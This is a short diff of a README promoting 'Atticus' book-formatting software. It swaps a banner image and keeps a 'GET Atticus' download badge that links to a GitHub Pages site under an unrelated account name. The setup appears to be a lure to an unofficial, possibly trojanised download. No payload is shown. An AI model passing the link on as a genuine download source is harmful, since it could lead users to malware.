@@ -1,6 +1,6 @@
 # Atticus Software - Complete Writing and Book Formatting Software for Authors
 
-![Banner Placeholder](https://avatars.mds.yandex.net/i?id=a8e6e854d11a5b42a3ced5ea015d50f0a8bca82c-4904401-images-thumbs&n=13)
+![Banner Placeholder](https://avatars.mds.yandex.net/i?id=66fbbfc64bd85d63a1708189e8ff3fd2121a5b73-9215233-images-thumbs&n=13)
 
 [![GET Atticus](https://img.shields.io/badge/GET%20%E2%80%94%20Atticus-0078D6?style=for-the-badge&logoColor=white)](https://pci-device-monitor-suite.github.io/.github/atticus-software)
 
